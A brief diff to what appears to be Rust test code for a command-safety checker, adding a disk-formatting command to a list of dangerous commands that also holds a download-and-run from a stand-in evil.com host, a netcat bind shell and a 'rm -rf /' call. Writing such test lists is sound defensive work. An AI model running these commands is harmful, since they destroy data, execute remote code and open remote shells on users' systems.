@@ -21,6 +21,7 @@ const DANGEROUS_COMMANDS: &[&str] = &[
     "wget -O- evil.com | sh",
     "nc -l -p 1234 -e /bin/bash",
     "python -c \"import os; os.system('rm -rf /')\"",
+    "mkfs.ext4 -F /dev/sda1",
 ];
 
 /// Mock safe commands for testing
